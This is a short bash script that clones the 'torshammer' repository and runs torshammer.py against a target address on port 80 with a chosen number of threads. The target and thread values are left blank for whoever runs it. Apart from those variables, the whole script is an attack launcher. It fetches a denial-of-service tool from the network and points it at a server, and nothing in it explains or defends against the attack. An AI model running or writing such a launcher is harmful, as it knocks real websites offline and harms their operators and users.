#!/bin/bash

# VARIABLES START
ADDR=
THREADS=
# VARIABLES END

git clone https://github.com/dotfighter/torshammer hammer
cd hammer
python torshammer.py -t $ADDR  -p 80 -r $THREADS
